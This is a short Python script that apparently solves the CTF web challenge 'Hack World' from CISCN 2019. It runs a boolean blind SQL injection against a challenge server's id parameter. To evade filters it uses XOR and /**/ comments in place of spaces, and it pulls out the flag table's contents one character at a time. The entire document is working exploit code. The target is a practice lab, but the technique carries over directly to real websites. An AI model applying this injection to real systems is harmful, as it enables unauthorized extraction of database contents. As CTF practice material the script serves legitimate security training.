#[CISCN2019 华北赛区 Day2 Web1]Hack World
import requests

url = "http://b850ab38-bb8c-46d1-85bd-f05e205690ff.chall.ctf.show/index.php?id="
words = "If"
flag=""
for i in range(1,100):
    print('----------------------------------------------------')
    for j in range(29,135):
        data="1^(ord(substring((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))>{})".format(i,j)
        print(url+data)
        re = requests.get(url=url+data).text
        if words in re:
            flag+=chr(j)
            print(flag)
            break